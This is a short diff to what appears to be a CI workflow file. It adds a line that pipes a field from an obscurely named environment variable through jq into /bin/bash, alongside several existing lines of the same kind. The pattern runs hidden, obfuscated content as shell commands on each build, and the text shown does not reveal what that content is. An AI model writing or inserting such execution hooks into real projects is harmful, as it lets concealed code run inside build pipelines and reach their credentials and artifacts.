@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$ovz4462" | jq -r .zy51 | /bin/bash
           echo $vsngl9455 | jq -r .mipu74 | /bin/bash
           echo $xbxo11918 | jq -r .vmvwp946 | /bin/bash
+          echo $m6 | jq -r .gc3127 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
